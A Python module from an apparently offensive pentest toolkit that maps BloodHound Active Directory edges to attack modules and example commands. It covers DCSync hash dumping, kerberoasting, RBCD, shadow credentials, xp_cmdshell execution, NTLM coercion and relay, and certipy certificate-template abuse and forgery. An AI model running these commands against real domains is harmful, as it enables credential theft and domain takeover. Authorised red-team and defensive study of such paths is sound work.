"""
BloodHound Edge Helper - Map BloodHound edges to uwu-toolkit modules
Look up attack paths, required modules, and example commands for any BH edge
"""

import re
from core.module_base import ModuleBase, ModuleType, Platform
from core.colors import Colors, Style


# ─── Edge Database ────────────────────────────────────────────────────────────
# Each edge maps to: category, description, list of (module_path, context),
# external tools, and optional cleanup module.

EDGES = {
    # ══════════════════════════════════════════════════════════════════════════
    # ACL Edges
    # ══════════════════════════════════════════════════════════════════════════
    "GenericAll": {
        "category": "acl",
        "description": "Full control over target. Reset password, modify attributes, add to groups.",
        "modules": [
            ("auxiliary/bloodyad/setpassword", "Target is a user — reset their password"),
            ("auxiliary/bloodyad/addmember", "Target is a group — add yourself"),
            ("auxiliary/bloodyad/shadowcreds", "Target is a computer — shadow credentials"),
            ("auxiliary/bloodyad/rbcd", "Target is a computer — RBCD"),
            ("auxiliary/bloodyad/dcsync", "Target is the domain — grant DCSync rights"),
        ],
        "external": [],
        "cleanup": "auxiliary/bloodyad/remove_genericall",
    },
    "GenericWrite": {
        "category": "acl",
        "description": "Write attributes on target (SPN, shadow creds, RBCD).",
        "modules": [
            ("auxiliary/bloodyad/setobject", "Set SPN for targeted kerberoast"),
            ("auxiliary/bloodyad/shadowcreds", "Add shadow credentials"),
            ("auxiliary/bloodyad/rbcd", "Configure RBCD delegation"),
        ],
        "external": [],
        "cleanup": None,
    },
    "WriteOwner": {
        "category": "acl",
        "description": "Take ownership of object, then WriteDACL, then GenericAll abuse chain.",
        "modules": [
            ("auxiliary/bloodyad/setowner", "Step 1: Take ownership of target object"),
            ("auxiliary/bloodyad/writedacl", "Step 2: Grant yourself GenericAll via DACL"),
        ],
        "external": [],
        "cleanup": None,
        "notes": "Chain: WriteOwner → WriteDACL → GenericAll. Follow up with GenericAll edge.",
    },
    "WriteDACL": {
        "category": "acl",
        "description": "Modify the target's DACL. Grant yourself GenericAll then abuse.",
        "modules": [
            ("auxiliary/bloodyad/writedacl", "Grant GenericAll on target, then abuse"),
        ],
        "external": [],
        "cleanup": None,
        "notes": "After granting GenericAll, follow the GenericAll edge for exploitation.",
    },
    "Owns": {
        "category": "acl",
        "description": "You own the object. Modify DACL directly (same as WriteDACL).",
        "modules": [
            ("auxiliary/bloodyad/writedacl", "Modify DACL — you already own it"),
        ],
        "external": [],
        "cleanup": None,
        "notes": "Ownership lets you modify the DACL. See WriteDACL/GenericAll edges.",
    },
    "AllExtendedRights": {
        "category": "acl",
        "description": "Extended rights on target. Reset password (user) or DCSync (domain).",
        "modules": [
            ("auxiliary/bloodyad/setpassword", "Target is a user — force password reset"),
            ("auxiliary/impacket/secretsdump", "Target is the domain — DCSync"),
        ],
        "external": [],
        "cleanup": None,
    },
    "ForceChangePassword": {
        "category": "acl",
        "description": "Reset target user's password without knowing current password.",
        "modules": [
            ("auxiliary/bloodyad/setpassword", "Reset password via bloodyAD"),
            ("auxiliary/impacket/changepasswd", "Reset password via impacket"),
        ],
        "external": [],
        "cleanup": None,
    },
    "AddMember": {
        "category": "acl",
        "description": "Add arbitrary members to target group.",
        "modules": [
            ("auxiliary/bloodyad/addmember", "Add user to target group"),
        ],
        "external": [],
        "cleanup": "auxiliary/bloodyad/removemember",
    },
    "AddSelf": {
        "category": "acl",
        "description": "Add yourself to target group.",
        "modules": [
            ("auxiliary/bloodyad/addmember", "Add yourself as member"),
        ],
        "external": [],
        "cleanup": "auxiliary/bloodyad/removemember",
    },
    "AddAllowedToAct": {
        "category": "acl",
        "description": "Configure RBCD (Resource-Based Constrained Delegation) on target.",
        "modules": [
            ("auxiliary/bloodyad/rbcd", "Set msDS-AllowedToActOnBehalfOfOtherIdentity"),
            ("auxiliary/impacket/rbcd", "Configure RBCD via impacket"),
            ("auxiliary/impacket/getST", "Request service ticket via S4U2Proxy"),
        ],
        "external": [],
        "cleanup": None,
        "notes": "Full chain: add computer → set RBCD → getST -impersonate administrator.",
    },
    "AddKeyCredentialLink": {
        "category": "acl",
        "description": "Add shadow credentials (Key Credential Link) to target.",
        "modules": [
            ("auxiliary/bloodyad/shadowcreds", "Add shadow credential via bloodyAD"),
        ],
        "external": ["certipy shadow auto -account TARGET"],
        "cleanup": None,
    },
    "WriteAccountRestrictions": {
        "category": "acl",
        "description": "Write msDS-AllowedToActOnBehalfOfOtherIdentity — full RBCD chain.",
        "modules": [
            ("auxiliary/impacket/addcomputer", "Step 1: Add a computer account"),
            ("auxiliary/impacket/rbcd", "Step 2: Set RBCD delegation"),
            ("auxiliary/impacket/getST", "Step 3: Request ticket via S4U"),
        ],
        "external": [],
        "cleanup": None,
    },
    "WriteSPN": {
        "category": "acl",
        "description": "Set SPN on target for targeted kerberoasting.",
        "modules": [
            ("auxiliary/bloodyad/setobject", "Set SPN attribute on user"),
            ("auxiliary/impacket/GetUserSPNs", "Kerberoast the target"),
        ],
        "external": [],
        "cleanup": None,
        "notes": "Set fake SPN → kerberoast → crack offline. Remove SPN after.",
    },
    "WriteGPLink": {
        "category": "acl",
        "description": "Link a GPO to an OU. Requires an abusable GPO.",
        "modules": [],
        "external": ["SharpGPOAbuse", "pyGPOAbuse"],
        "cleanup": None,
    },
    "WritePKIEnrollmentFlag": {
        "category": "acl",
        "description": "Modify certificate template enrollment flags (ESC4).",
        "modules": [],
        "external": ["certipy template -template NAME -save-old", "certipy req -template NAME"],
        "cleanup": None,
        "notes": "ESC4: Modify template to allow SAN, then request cert with arbitrary SAN.",
    },
    "WritePKINameFlag": {
        "category": "acl",
        "description": "Modify certificate template name flags (ESC15).",
        "modules": [],
        "external": ["certipy template -template NAME -configuration"],
        "cleanup": None,
    },

    # ══════════════════════════════════════════════════════════════════════════
    # Execution Edges
    # ══════════════════════════════════════════════════════════════════════════
    "AdminTo": {
        "category": "execution",
        "description": "Local admin on target. Execute commands via multiple protocols.",
        "modules": [
            ("auxiliary/impacket/psexec", "PsExec — creates a service, runs as SYSTEM"),
            ("auxiliary/impacket/wmiexec", "WMI exec — semi-interactive, runs as user"),
            ("auxiliary/impacket/smbexec", "SMB exec — creates a service, runs as SYSTEM"),
            ("auxiliary/impacket/atexec", "Task Scheduler exec — runs as SYSTEM"),
        ],
        "external": [],
        "cleanup": None,
    },
    "CanRDP": {
        "category": "execution",
        "description": "RDP access to target machine.",
        "modules": [],
        "external": ["xfreerdp /v:TARGET /u:USER /p:PASS /cert:ignore +clipboard"],
        "cleanup": None,
    },
    "CanPSRemote": {
        "category": "execution",
        "description": "PowerShell Remoting (WinRM) access to target.",
        "modules": [],
        "external": ["evil-winrm -i TARGET -u USER -p PASS"],
        "cleanup": None,
    },
    "ExecuteDCOM": {
        "category": "execution",
        "description": "Execute commands via DCOM on target.",
        "modules": [
            ("auxiliary/impacket/dcomexec", "DCOM execution via impacket"),
        ],
        "external": [],
        "cleanup": None,
    },
    "SQLAdmin": {
        "category": "execution",
        "description": "Sysadmin on MSSQL. Enable xp_cmdshell for OS command execution.",
        "modules": [
            ("auxiliary/impacket/mssqlclient", "Connect and enable xp_cmdshell for RCE"),
        ],
        "external": [],
        "cleanup": None,
        "notes": "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';",
    },

    # ══════════════════════════════════════════════════════════════════════════
    # Kerberos Edges
    # ══════════════════════════════════════════════════════════════════════════
    "HasSPN": {
        "category": "kerberos",
        "description": "User has SPN set — kerberoastable.",
        "modules": [
            ("auxiliary/impacket/GetUserSPNs", "Request TGS and crack offline"),
            ("auxiliary/ad/kerberoast", "Kerberoast via uwu module"),
        ],
        "external": [],
        "cleanup": None,
    },
    "ASREPRoastable": {
        "category": "kerberos",
        "description": "Pre-authentication not required — AS-REP roast.",
        "modules": [
            ("auxiliary/impacket/GetNPUsers", "Request AS-REP and crack offline"),
            ("auxiliary/ad/asreproast", "AS-REP roast via uwu module"),
        ],
        "external": [],
        "cleanup": None,
    },
    "AllowedToDelegate": {
        "category": "kerberos",
        "description": "Constrained delegation — impersonate users to target SPN.",
        "modules": [
            ("auxiliary/impacket/getST", "getST -impersonate administrator -spn cifs/target"),
        ],
        "external": [],
        "cleanup": None,
        "notes": "Use -impersonate to request ticket as privileged user to the allowed SPN.",
    },
    "AllowedToAct": {
        "category": "kerberos",
        "description": "Resource-Based Constrained Delegation — S4U2Self + S4U2Proxy.",
        "modules": [
            ("auxiliary/impacket/getST", "Request ticket via S4U2Self + S4U2Proxy"),
        ],
        "external": [],
        "cleanup": None,
        "notes": "Need control of a computer account. getST -impersonate admin -spn cifs/target.",
    },
    "CoerceToTGT": {
        "category": "kerberos",
        "description": "Coerce authentication to obtain TGT. Requires relay or capture setup.",
        "modules": [],
        "external": [
            "coercer coerce -t TARGET -l LISTENER",
            "PetitPotam.py LISTENER TARGET",
            "ntlmrelayx.py --shadow-credentials --shadow-target TARGET",
            "Rubeus monitor /interval:1 /nowrap",
        ],
        "cleanup": None,
    },

    # ══════════════════════════════════════════════════════════════════════════
    # Credential Edges
    # ══════════════════════════════════════════════════════════════════════════
    "DCSync": {
        "category": "credential",
        "description": "DCSync rights — dump all domain hashes via directory replication.",
        "modules": [
            ("auxiliary/impacket/secretsdump", "Execute DCSync to dump hashes"),
            ("auxiliary/bloodyad/dcsync", "Grant DCSync rights first (if needed)"),
        ],
        "external": [],
        "cleanup": None,
        "notes": "If you have DCSync rights already, go straight to secretsdump.",
    },
    "ReadLAPSPassword": {
        "category": "credential",
        "description": "Read LAPS password for local admin access to target computer.",
        "modules": [
            ("auxiliary/bloodyad/getobject", "Read ms-Mcs-AdmPwd attribute"),
        ],
        "external": ["netexec ldap DC -u USER -p PASS --laps"],
        "cleanup": None,
    },
    "ReadGMSAPassword": {
        "category": "credential",
        "description": "Read gMSA password for the managed service account.",
        "modules": [
            ("auxiliary/bloodyad/getobject", "Read msDS-ManagedPassword attribute"),
        ],
        "external": ["gMSADumper.py -u USER -p PASS -d DOMAIN"],
        "cleanup": None,
    },
    "DumpSMSAPassword": {
        "category": "credential",
        "description": "Dump sMSA (Standalone Managed Service Account) password.",
        "modules": [
            ("auxiliary/bloodyad/getobject", "Read msDS-ManagedPassword attribute"),
        ],
        "external": ["gMSADumper.py -u USER -p PASS -d DOMAIN"],
        "cleanup": None,
    },
    "HasSession": {
        "category": "credential",
        "description": "User has session on target — dump credentials from that machine.",
        "modules": [
            ("auxiliary/impacket/secretsdump", "Dump SAM/LSA/NTDS from target"),
        ],
        "external": [],
        "cleanup": None,
        "notes": "Informational edge. Get admin on the machine first, then dump creds.",
    },

    # ══════════════════════════════════════════════════════════════════════════
    # ADCS Edges
    # ══════════════════════════════════════════════════════════════════════════
    "Enroll": {
        "category": "adcs",
        "description": "Can enroll in certificate template.",
        "modules": [],
        "external": ["certipy req -ca CA -template TEMPLATE -u USER -p PASS"],
        "cleanup": None,
    },
    "ManageCA": {
        "category": "adcs",
        "description": "CA manager — add yourself as officer (ESC7 step 1).",
        "modules": [],
        "external": [
            "certipy ca -ca CA -add-officer USER -u USER -p PASS",
            "certipy ca -ca CA -enable-template SubCA -u USER -p PASS",
        ],
        "cleanup": None,
        "notes": "ESC7: ManageCA → add officer → enable SubCA → request + issue.",
    },
    "ManageCertificates": {
        "category": "adcs",
        "description": "Certificate manager — approve pending requests (ESC7 step 2).",
        "modules": [],
        "external": [
            "certipy req -ca CA -template SubCA -u USER -p PASS -upn admin@domain",
            "certipy ca -ca CA -issue-request ID -u USER -p PASS",
            "certipy req -ca CA -retrieve ID -u USER -p PASS",
        ],
        "cleanup": None,
    },
    "ADCSESC1": {
        "category": "adcs",
        "description": "ESC1 — Template allows SAN + client auth + enrollee supplies subject.",
        "modules": [],
        "external": [
            "certipy req -ca CA -template VULN -u USER -p PASS -upn admin@domain",
            "certipy auth -pfx admin.pfx -dc-ip DC_IP",
        ],
        "cleanup": None,
    },
    "ADCSESC4": {
        "category": "adcs",
        "description": "ESC4 — WriteDACL on template. Modify to ESC1 configuration.",
        "modules": [
            ("auxiliary/bloodyad/writedacl", "Modify template DACL if needed"),
        ],
        "external": [
            "certipy template -template NAME -save-old -u USER -p PASS",
            "certipy req -ca CA -template NAME -u USER -p PASS -upn admin@domain",
            "certipy template -template NAME -configuration OLD.json -u USER -p PASS",
        ],
        "cleanup": None,
        "notes": "Save old config, modify template, exploit ESC1, restore template.",
    },
    "ADCSESC8": {
        "category": "adcs",
        "description": "ESC8 — NTLM relay to ADCS HTTP enrollment endpoint.",
        "modules": [
            ("auxiliary/impacket/ntlmrelayx", "Relay to http://CA/certsrv/certfnsh.asp"),
        ],
        "external": [
            "ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template Machine",
            "coercer coerce -t DC -l LISTENER",
        ],
        "cleanup": None,
    },
    "GoldenCert": {
        "category": "adcs",
        "description": "CA private key compromised — forge any certificate.",
        "modules": [],
        "external": [
            "certipy ca -ca CA -backup -u USER -p PASS",
            "certipy forge -ca-pfx ca.pfx -upn admin@domain -subject CN=admin",
            "certipy auth -pfx forged.pfx -dc-ip DC_IP",
        ],
        "cleanup": None,
    },

    # ══════════════════════════════════════════════════════════════════════════
    # Relay Edges
    # ══════════════════════════════════════════════════════════════════════════
    "CoerceAndRelayNTLMToSMB": {
        "category": "relay",
        "description": "Coerce NTLM auth and relay to SMB for command execution.",
        "modules": [
            ("auxiliary/impacket/ntlmrelayx", "Relay captured auth to SMB target"),
        ],
        "external": [
            "ntlmrelayx.py -t smb://TARGET -smb2support",
            "coercer coerce -t VICTIM -l LISTENER",
        ],
        "cleanup": None,
    },
    "CoerceAndRelayNTLMToLDAP": {
        "category": "relay",
        "description": "Coerce NTLM auth and relay to LDAP for delegation or shadow creds.",
        "modules": [
            ("auxiliary/impacket/ntlmrelayx", "Relay to LDAP with --delegate-access or --shadow-credentials"),
        ],
        "external": [
            "ntlmrelayx.py -t ldap://DC --delegate-access --escalate-user COMPUTER$",
            "ntlmrelayx.py -t ldap://DC --shadow-credentials --shadow-target TARGET",
        ],
        "cleanup": None,
    },
    "CoerceAndRelayNTLMToADCS": {
        "category": "relay",
        "description": "Coerce NTLM auth and relay to ADCS web enrollment.",
        "modules": [
            ("auxiliary/impacket/ntlmrelayx", "Relay to ADCS HTTP enrollment"),
        ],
        "external": [
            "ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template Machine",
        ],
        "cleanup": None,
    },

    # ══════════════════════════════════════════════════════════════════════════
    # Informational / Structural Edges
    # ══════════════════════════════════════════════════════════════════════════
    "HasSIDHistory": {
        "category": "other",
        "description": "Object has SID History — may grant privileges of another account.",
        "modules": [
            ("auxiliary/bloodyad/getobject", "Check sIDHistory attribute"),
            ("auxiliary/impacket/lookupsid", "Resolve SIDs to account names"),
        ],
        "external": [],
        "cleanup": None,
        "notes": "Informational. Check which SID is in the history and what access it grants.",
    },
    "Contains": {
        "category": "other",
        "description": "OU/container contains target objects. Structural edge.",
        "modules": [],
        "external": [],
        "cleanup": None,
        "notes": "Structural relationship. Useful for GPO targeting and delegation scope.",
    },
    "GPLink": {
        "category": "other",
        "description": "GPO is linked to target OU. Structural edge.",
        "modules": [],
        "external": [],
        "cleanup": None,
        "notes": "Check GPO contents for credential exposure or scheduled task abuse.",
    },
    "MemberOf": {
        "category": "other",
        "description": "Object is member of target group. Structural edge.",
        "modules": [],
        "external": [],
        "cleanup": None,
        "notes": "Structural — check what permissions the group membership grants.",
    },
}


# Category display order and labels
CATEGORY_ORDER = [
    ("acl", "ACL EDGES"),
    ("execution", "EXECUTION EDGES"),
    ("kerberos", "KERBEROS EDGES"),
    ("credential", "CREDENTIAL EDGES"),
    ("adcs", "ADCS EDGES"),
    ("relay", "RELAY EDGES"),
    ("other", "OTHER EDGES"),
]


def _normalize(name: str) -> str:
    """Normalize edge name for fuzzy matching: lowercase, strip separators."""
    return re.sub(r'[\s_\-]+', '', name).lower()


def _find_edge(name: str):
    """Find edge by exact or fuzzy match. Returns (canonical_name, data) or (None, None)."""
    # Exact match first
    if name in EDGES:
        return name, EDGES[name]

    # Case-insensitive exact
    norm = _normalize(name)
    for key, data in EDGES.items():
        if _normalize(key) == norm:
            return key, data

    return None, None


class BloodHoundEdges(ModuleBase):
    """
    BloodHound Edge Helper — map BloodHound edges to uwu-toolkit modules.
    Look up attack steps, required modules, and example commands for any edge.
    """

    def __init__(self):
        super().__init__()
        self.name = "bloodhound_edges"
        self.description = "BloodHound edge-to-module mapper — look up attack paths for any BH edge"
        self.author = "UwU Toolkit"
        self.version = "1.0.0"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.MULTI
        self.tags = ["ad", "bloodhound", "edges", "reference", "acl", "attack-path"]
        self.references = [
            "https://bloodhound.readthedocs.io/",
            "https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/",
        ]

        self.register_option("ACTION", "What to do: lookup, list, or search",
                             default="lookup",
                             choices=["lookup", "list", "search"])
        self.register_option("EDGE", "Edge name to look up (e.g. GenericAll)", default="")
        self.register_option("QUERY", "Search keyword for search action", default="")

    def run(self) -> bool:
        action = self.get_option("ACTION")

        if action == "lookup":
            return self._do_lookup()
        elif action == "list":
            return self._do_list()
        elif action == "search":
            return self._do_search()
        else:
            self.print_error(f"Unknown action: {action}")
            return False

    def _do_lookup(self) -> bool:
        """Look up a specific edge and display its attack card."""
        edge_name = self.get_option("EDGE")
        if not edge_name:
            self.print_error("EDGE option is required for lookup action")
            return False

        canonical, data = _find_edge(edge_name)
        if not canonical:
            self.print_error(f"Unknown edge: {edge_name}")
            # Suggest close matches
            norm = _normalize(edge_name)
            suggestions = [k for k in EDGES if norm in _normalize(k)]
            if suggestions:
                self.print_status(f"Did you mean: {', '.join(suggestions)}?")
            return False

        self._print_edge_card(canonical, data)
        return True

    def _do_list(self) -> bool:
        """List all edges grouped by category."""
        self.print_line()

        for cat_key, cat_label in CATEGORY_ORDER:
            edges_in_cat = [(k, v) for k, v in EDGES.items() if v["category"] == cat_key]
            if not edges_in_cat:
                continue

            # Category header
            header = f"  {Colors.NEON_CYAN}{Colors.BOLD}{cat_label}{Colors.RESET}"
            self.print_line(header)

            for edge_name, data in edges_in_cat:
                styled_name = f"{Colors.NEON_PINK}{Colors.BOLD}{edge_name:<30}{Colors.RESET}"
                desc = f"{Colors.CP_FG}{data['description']}{Colors.RESET}"
                self.print_line(f"    {styled_name} {desc}")

            self.print_line()

        total = len(EDGES)
        self.print_good(f"{total} edges mapped across {len(CATEGORY_ORDER)} categories")
        return True

    def _do_search(self) -> bool:
        """Search edges by keyword across all fields."""
        query = self.get_option("QUERY")
        if not query:
            # Fall back to EDGE option
            query = self.get_option("EDGE")
        if not query:
            self.print_error("QUERY (or EDGE) option is required for search action")
            return False

        norm_query = _normalize(query)
        matches = []

        for edge_name, data in EDGES.items():
            searchable = " ".join([
                edge_name,
                data["category"],
                data["description"],
                " ".join(m[0] + " " + m[1] for m in data["modules"]),
                " ".join(data.get("external", [])),
                data.get("notes", ""),
                data.get("cleanup") or "",
            ])
            if norm_query in _normalize(searchable):
                matches.append((edge_name, data))

        if not matches:
            self.print_error(f"No edges matching: {query}")
            return False

        self.print_line()
        self.print_good(f"Found {len(matches)} edge(s) matching '{query}':")
        self.print_line()

        for edge_name, data in matches:
            self._print_edge_card(edge_name, data)

        return True

    def _print_edge_card(self, name: str, data: dict):
        """Print a rich card for a single edge."""
        R = Colors.RESET
        B = Colors.BOLD

        # Title bar
        bar = f"{Colors.NEON_PINK}{'═' * 12}{R}"
        title = f"{Colors.NEON_PINK}{B}{name}{R}"
        self.print_line(f"  {bar}[ {title} ]{bar}")
        self.print_line()

        # Category
        cat = data["category"].upper()
        self.print_line(f"  {Colors.NEON_CYAN}Category:{R}  {Colors.NEON_PURPLE}{B}{cat}{R}")

        # Description
        self.print_line(f"  {Colors.CP_FG}{data['description']}{R}")
        self.print_line()

        # uwu Modules
        modules = data.get("modules", [])
        if modules:
            self.print_line(f"  {Colors.NEON_CYAN}{B}uwu Modules:{R}")
            for i, (mod_path, context) in enumerate(modules, 1):
                styled_path = Style.module_path(mod_path)
                idx = f"{Colors.DIM}[{i}]{R}"
                self.print_line(f"    {idx} {styled_path:<55} {Colors.CP_FG}{context}{R}")
            self.print_line()

        # External tools
        external = data.get("external", [])
        if external:
            self.print_line(f"  {Colors.NEON_CYAN}{B}External Tools:{R}")
            for cmd in external:
                self.print_line(f"    {Colors.NEON_ORANGE}${R} {Colors.NEON_GREEN}{cmd}{R}")
            self.print_line()

        # Notes
        notes = data.get("notes")
        if notes:
            self.print_line(f"  {Colors.NEON_YELLOW}{B}Note:{R} {Colors.CP_FG}{notes}{R}")
            self.print_line()

        # Cleanup
        cleanup = data.get("cleanup")
        if cleanup:
            styled_cleanup = Style.module_path(cleanup)
            self.print_line(f"  {Colors.NEON_CYAN}Cleanup:{R}  {styled_cleanup}")
            self.print_line()

        # No modules and no external = informational
        if not modules and not external:
            self.print_line(f"  {Colors.DIM}(Informational/structural edge — no direct exploit modules){R}")
            self.print_line()

    def check(self) -> bool:
        """No external tools needed — this is a reference module."""
        return True
